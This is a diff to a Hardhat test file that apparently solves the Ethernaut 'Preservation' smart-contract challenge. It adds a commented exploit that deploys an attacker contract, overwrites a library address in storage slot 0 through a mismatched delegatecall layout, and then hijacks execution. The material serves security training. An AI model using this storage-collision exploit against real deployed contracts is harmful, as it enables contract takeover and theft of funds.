@@ -18,7 +18,16 @@ describe("Preservation", async function () {
     });
 
     it("Exploit", async function () {
-
+        // This one was kinda tricky
+        // First, we need to deploy the attacker contract
+        // Secondly, we need to call `setFirstTime` ot `setSecondTime` passing 
+        // the address of the attacker contract casted to uint256 type as `_timeStamp`
+        // Then, since the `timeZone1Library` and `storedTime` are both located in storage slot 0
+        // the `timeZone1Library` will get overriden with the value we pass as `_timeStamp` (the attacker contract address)
+        // Finally, we call the `setFirstTime` which will delegatecall the attacker contract address located at slot 0
+        const attacker = await (await ethers.getContractFactory("PreservationAttack")).connect(player).deploy();
+        await instance.connect(player).setFirstTime(ethers.BigNumber.from(attacker.address));
+        await instance.connect(player).setFirstTime(0);
     });
 
     after(async function () {
